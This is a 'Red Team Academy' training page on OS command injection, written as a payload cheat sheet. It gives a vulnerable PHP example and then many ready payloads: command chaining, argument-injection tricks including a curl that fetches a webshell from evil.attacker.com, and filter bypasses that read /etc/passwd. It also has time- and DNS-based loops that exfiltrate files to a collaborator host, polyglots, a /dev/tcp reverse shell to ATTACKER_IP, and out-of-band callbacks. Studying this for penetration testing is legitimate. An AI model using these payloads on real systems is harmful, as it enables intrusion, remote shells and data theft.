---
layout: training-page
title: "Command Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - command-injection
  - rce
  - os-injection
  - filter-bypass
  - blind-injection
page_key: "web-command-injection"
render_with_liquid: false
---

# Command Injection

Command injection (also called OS command injection or shell injection) is a vulnerability that allows an attacker to execute arbitrary operating system commands on the host server. It arises when an application passes unsafe user-supplied input to a system shell without adequate sanitization.

## Tools

- **commix** — Automated all-in-one OS command injection and exploitation tool — `github.com/commixproject/commix`
- **interactsh** — OOB interaction gathering server for blind injection confirmation — `github.com/projectdiscovery/interactsh`

## How It Works

Consider a PHP script that pings a user-supplied IP address:

```
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

If the attacker provides `8.8.8.8; cat /etc/passwd`, the executed command becomes:

```
ping -c 4 8.8.8.8; cat /etc/passwd
```

The system first pings, then executes the second command, dumping `/etc/passwd`.

## Basic Commands

Once injection is confirmed, start with simple enumeration:

```
cat /etc/passwd
whoami
id
uname -a
hostname
```

## Chaining Commands

Multiple characters can chain or redirect commands. Understanding each operator is essential for crafting working payloads:

```
command1; command2   # Execute command1, then command2 regardless of exit code
command1 && command2 # Execute command2 only if command1 succeeds (exit 0)
command1 || command2 # Execute command2 only if command1 fails (non-zero exit)
command1 & command2  # Execute command1 in background, then command2
command1 | command2  # Pipe output of command1 as input to command2
```

## Injection Inside a Command

When the injection point is inside an existing command, use subshell syntax to execute nested commands:

```
# Backtick subshell execution
original_cmd_by_server `cat /etc/passwd`

# Dollar-sign subshell substitution
original_cmd_by_server $(cat /etc/passwd)
```

## Argument Injection

When you can only append arguments to an existing command rather than injecting a full new command, leverage flags that trigger external execution:

```
# Chrome: execute via GPU launcher flag
chrome '--gpu-launcher="id>/tmp/foo"'

# SSH: execute via ProxyCommand option
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo

# psql: pipe output to a command
psql -o'|id>/tmp/foo'

# curl: write output to a webshell location
curl http://evil.attacker.com/ -o webshell.php
```

The [Argument Injection Vectors](https://sonarsource.github.io/argument-injection-vectors/) reference by Sonar catalogs argument injection paths for many binaries.

## Filter Bypasses

Web applications often blacklist characters like spaces, slashes, or specific keywords. The following techniques bypass common filters.

### Bypass Without Space

Use alternatives to the space character when it is blocked:

```
# $IFS (Internal Field Separator) substitutes for space
cat${IFS}/etc/passwd
ls${IFS}-la

# Brace expansion — shell treats items as separate arguments
{cat,/etc/passwd}

# Input redirection — read file without space
cat</etc/passwd

# ANSI-C quoting with hex-encoded space (\x20)
X=$'uname\x20-a'&&$X

# Tab character (ASCII 0x09) as space alternative
;ls%09-al%09/home

# Windows: substring from environment variable
ping%CommonProgramFiles:~10,-18%127.0.0.1
```

### Bypass With Line Return and Backslash Newline

```
# Newline between commands
original_cmd_by_server
ls

# Backslash-newline to split a command across lines
cat /et\
c/pa\
sswd

# URL-encoded backslash-newline form
cat%20/et%5C%0Ac/pa%5C%0Asswd
```

### Bypass With Brace Expansion

```
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```

### Bypass Characters Filter (No Slash)

```
# Use variable expansion to produce /
echo ${HOME:0:1}       # outputs /
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Use tr to generate / from .
echo . | tr '!-0' '"-1'
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Bypass Via Hex Encoding

```
# Decode hex path with echo -e
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

# Assign hex to variable
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'; cat $abc

# Decode with xxd
xxd -r -p <<< 2f6574632f706173737764
cat `xxd -r -p <<< 2f6574632f706173737764`
```

### Bypass With Quote Insertion

Inserting quotes inside a command breaks keyword detection while keeping the command valid:

```
# Single quotes
w'h'o'am'i
wh''oami

# Double quotes
w"h"o"am"i
wh""oami

# Backticks
wh``oami

# Backslash characters
w\ho\am\i
/\b\i\n/////s\h
```

### Bypass With $@ and $()

```
# $@ and $0 expand to empty/shell name
who$@ami
echo whoami|$0

# $() subshell insertion
who$()ami
who$(echo am)i
who`echo am`i
```

### Bypass With Variable Expansion

```
# Wildcards in path
/???/??t /???/p??s??

# Variable substring manipulation
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### Bypass With Wildcards (Windows)

```
powershell C:\*\*2\n??e*d.*?   # launches notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e  # launches calc
```

### Bypass With Random Case (Windows)

Windows does not distinguish uppercase from lowercase in commands or file paths:

```
wHoAmi
DiR c:\

```

## Data Exfiltration

### Time-Based Data Exfiltration

Extract data one character at a time by measuring response delays. A correct guess causes a sleep; incorrect guesses return immediately:

```
# Test if first character of whoami output is 's' — waits 5 seconds if true
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi

# Automate: increment index and iterate through characters
for i in $(seq 1 20); do
  for c in {a..z} {0..9}; do
    time if [ $(whoami|cut -c $i) == $c ]; then sleep 3; fi
  done
done
```

### DNS-Based Data Exfiltration

Exfiltrate command output via DNS lookups to a server you control. Use `app.interactsh.com` or Burp Collaborator to capture the lookups:

```
# Exfiltrate directory listing — each filename appears as a DNS subdomain
for i in $(ls /); do host "$i.YOUR-INTERACTSH-URL"; done

# Exfiltrate a file's contents
for i in $(cat /etc/passwd | tr '\n' ' '); do host "$i.YOUR-INTERACTSH-URL"; done

# Combine with base64 to handle special characters
data=$(cat /etc/passwd | base64 | tr -d '=\n')
for chunk in $(echo $data | fold -w 50); do
  host "${chunk}.YOUR-INTERACTSH-URL"
done
```

## Polyglot Command Injection

A polyglot payload works across multiple injection contexts simultaneously — useful when you do not know the exact quote context of the injection point:

```
# Works inside unquoted, single-quoted, and double-quoted command contexts
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Complex polyglot for multiple contexts
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

## Tricks

### Backgrounding Long-Running Commands

If the application kills long-running child processes, use `nohup` and background execution to keep your process alive after the parent exits:

```
nohup sleep 120 > /dev/null &
nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
```

### Remove Arguments After Injection

Use `--` to signal end-of-options so any trailing arguments from the original command are treated as filenames rather than flags:

```
; id -- ignored_original_args
```

## Blind Command Injection

When there is no visible output, confirm injection with out-of-band techniques:

```
# Ping your server (confirm execution via packet capture)
; ping -c 4 ATTACKER_IP

# DNS lookup to interactsh (confirm via DNS log)
; nslookup $(whoami).YOUR-INTERACTSH-URL

# HTTP request to Burp Collaborator
; curl http://YOUR-COLLABORATOR-URL/$(whoami)

# Write output to a web-accessible file
; whoami > /var/www/html/output.txt
```

## Resources

- PayloadsAllTheThings — Command Injection — `github.com/swisskyrepo/PayloadsAllTheThings`
- commix — Automated Command Injection Tool — `github.com/commixproject/commix`
- interactsh — OOB Interaction Server — `github.com/projectdiscovery/interactsh`
- Argument Injection Vectors — SonarSource — `sonarsource.github.io/argument-injection-vectors`
**PortSwigger Practice Labs (recommended in sequence):**
- OS command injection, simple case — `portswigger.net/web-security/os-command-injection/lab-simple`
- Blind OS command injection with time delays — `portswigger.net/web-security/os-command-injection/lab-blind-time-delays`
- Blind OS command injection with out-of-band interaction — `portswigger.net/web-security/os-command-injection/lab-blind-out-of-band`

- PortSwigger OS Command Injection — `portswigger.net/web-security/os-command-injection`
- WorstFit: Unveiling Hidden Transformers in Windows ANSI — Orange Tsai — `blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi`
